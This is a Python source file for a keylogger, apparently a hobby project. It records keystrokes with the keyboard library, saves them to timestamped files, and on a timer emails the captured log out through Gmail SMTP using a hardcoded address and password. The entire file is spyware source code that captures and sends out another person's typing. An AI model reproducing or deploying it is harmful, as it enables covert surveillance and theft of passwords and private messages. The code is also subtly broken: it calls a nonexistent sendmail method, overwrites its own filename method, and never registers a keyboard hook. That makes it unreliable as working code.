#!/usr/bin/env python
#-*- coding: utf-8 -*-
#strong ephases on classes and hierchy or inheritence/abstract classes
#if the is an if or else statement turn it into a terinary statement
#array list or collectrions
#reading writting to files
import keyboard
import smtplib
from threading import Timer
from datetime import datetime


#static variables 
EMAIL = "keypoggers@gmail.com"
EMAILPASS = "ZDSBNJKHF!62ukzhgkuyfwuS@D%@!3ndhvgwe"
SECINDAY = 86400


class Keylogger:
    def __init__(self,interval):
        self.interval = interval
       #the string that logs keystrokes
        self.log = ""
        #records date and time of starting and ending
        self.startDate = datetime.now()
        self.endDate = datetime.now()
      
    def keysTracking(self,event):
      #call this with KET_UP event 
        #here is where we detect keys being pressed
      name = event.name

      if len(name) > 1:
            #for special keys

            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                #catches anything else as an underscore [IMPROVE LATER]
                name = " "

      self.log += name

    def filename(self):
        startDatestr = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
        endDatestr = str(self.endDate)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{startDatestr}_{endDatestr}"
        #f strings loooking iffy here idk if its vim but we'll see
    def fileHandler(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file = f)

        print(f"[+] Saved {self.filename}.txt")

    def carrierPidgeon(self, email,password, message):
        #sending the emaill

        #connect to mail server
        server = smtplib.SMTP(host="smtp.gmail.com", port=2525)
        server.starttls()
        #logging in time
        server.login(email, password)

        server.sendmail(email, email, message)
        
        server.quit

    def report(self):
        if self.log:
            self.endDate = datetime.now()
            self.filename()
            self.sendmail(EMAIL, EMAILPASS, self.log)
            self.fileHandler()
        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)

        timer.daemon = True

        timer.start()

